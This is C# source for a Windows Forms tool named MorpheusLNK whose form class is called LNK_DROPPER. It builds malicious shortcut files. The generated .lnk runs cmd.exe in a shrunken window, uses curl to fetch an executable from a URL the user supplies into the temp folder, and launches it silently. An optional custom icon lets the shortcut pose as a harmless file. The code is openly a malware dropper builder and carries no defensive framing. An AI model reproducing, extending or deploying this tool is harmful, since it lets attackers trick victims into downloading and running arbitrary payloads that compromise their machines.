using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary;

namespace MorpheusLNK
{
    public partial class LNK_DROPPER : Form
    {
        private string iconFilePath = null;

        public LNK_DROPPER()
        {
            InitializeComponent();
        }

        private async void lnkBuild_btn_Click(object sender, EventArgs e)
        {
            string url = downloadUrl_Box.Text;
            string exename = afterExe_Name.Text;

            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(exename))
            {
                SetStatusLabel("STATUS: ERROR - URL AND EXE NAME CANNOT BE EMPTY!", Color.Red);
            }
            else
            {
                saveFileDialog1.Title = "Save LNK";
                saveFileDialog1.Filter = "Ярлык (*.lnk)|*.lnk";
                saveFileDialog1.FileName = "Build.lnk";

                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    string shortcutPath = saveFileDialog1.FileName;

                    WshShell shell = new WshShell();
                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
                    shortcut.TargetPath = "cmd.exe";
                    shortcut.Arguments = $"/c mode 15,1 & curl {url} -o %temp%\\{exename} & start /b %temp%\\{exename}";

                    if (iconFilePath != null)
                    {
                        shortcut.IconLocation = iconFilePath;
                    }

                    shortcut.Save();

                    SetStatusLabel("STATUS: LNK CREATED SUCCESSFULLY!", Color.Green);
                }
            }
        }

        private async void SetStatusLabel(string text, Color color)
        {
            statusLabel.ForeColor = color;
            statusLabel.Text = text;
            await Task.Delay(3000);
            statusLabel.Text = "";
        }

        private void selectImg_BTN_Click(object sender, EventArgs e)
        {
            openFileDialog1.Filter = "ICO files|*.ico";
            openFileDialog1.Title = "Open ICO File";
            openFileDialog1.FileName = ".ico";

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                if (System.IO.File.Exists(openFileDialog1.FileName))
                {
                    ink_Icon.Image = Image.FromFile(openFileDialog1.FileName);

                    iconFilePath = openFileDialog1.FileName;
                }
                else
                {
                    MessageBox.Show("Selected file does not exists!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}
